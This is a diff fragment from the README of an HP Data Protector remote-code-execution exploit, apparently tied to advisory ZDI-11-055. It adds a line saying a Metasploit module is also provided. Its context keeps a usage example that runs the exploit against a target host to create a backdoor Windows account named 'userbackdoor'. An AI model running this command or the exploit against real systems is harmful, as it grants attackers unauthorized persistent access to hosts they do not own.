@@ -19,5 +19,8 @@ The existing exploits allows to execute a single command without parameters and 
 
 ```hp_data_protector_rce.py 192.168.1.1 5555 'net user userbackdoor pwdbackdoor /ADD'```
 
+# Metasploit module
+The exploit is also provided with a Metasploit module.
+
 # Reference:
 http://www.zerodayinitiative.com/advisories/ZDI-11-055/
